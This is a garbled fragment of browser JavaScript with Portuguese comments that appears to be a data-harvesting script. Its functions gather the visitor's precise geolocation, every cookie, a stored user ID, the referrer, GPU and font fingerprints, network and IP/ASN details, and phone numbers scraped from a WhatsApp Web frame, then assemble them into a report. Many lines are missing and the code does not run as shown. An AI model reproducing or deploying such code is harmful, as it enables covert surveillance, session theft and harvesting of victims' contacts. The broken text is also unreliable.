    function getWebGLRenderer() {

        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      } catch {
        return "Não suportado";
      }
    }

    // Função para pegar as fontes instaladas
    function getFontList() {
      const fonts = ['Arial','Verdana','Times New Roman','Courier','Tahoma','Georgia','Comic Sans MS','Impact','Trebuchet MS','Calibri'];
      const available = [];
      const canvas = document.createElement("canvas");

          available.push(font);
        }
      });
      return available;
    }

    // Função para pegar informações da rede de internet
    function getNetworkInfo() {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (connection) {
        return {
          type: connection.effectiveType,
          downlink: connection.downlink
        };
      }
      return { type: "Desconhecido", downlink: "Desconhecido" };
    }

    // Função para pegar geolocalização detalhada
    function obterLocalizacaoDetalhada() {
      return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(position => {
            resolve({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            });
          }, reject);
        } else {
          reject("Geolocalização não disponível.");
        }
      });
    }

    // Função para pegar cookies
    function getCookies() {
      return document.cookie;
    }

    // Função para pegar dados do localStorage
    function getLocalStorageData() {
      return localStorage.getItem('usuarioID') || "N/A";
    }

    // Função para pegar dados de referer
    function getReferer() {
      return document.referrer || "N/A";
    }

    // Função para pegar o número do WhatsApp Web
    function getWhatsAppNumber() {

      const iframe = document.querySelector('iframe[src*="web.whatsapp.com"]');

        try {
          const iframeWindow = iframe.contentWindow;
          const contacts = iframeWindow.document.querySelectorAll('.two');

              numbers.push(number);

          });

        }

    }

      }
      return "Desconhecido";
    }

        provedor: ipData.org || "N/A",
        asn: ipData.asn || "N/A",

        whatsappNumber: getWhatsAppNumber(),
        wifiInfo: getWiFiInfo()

Navegador: ${data.navegador}
Idioma: ${data.idioma}
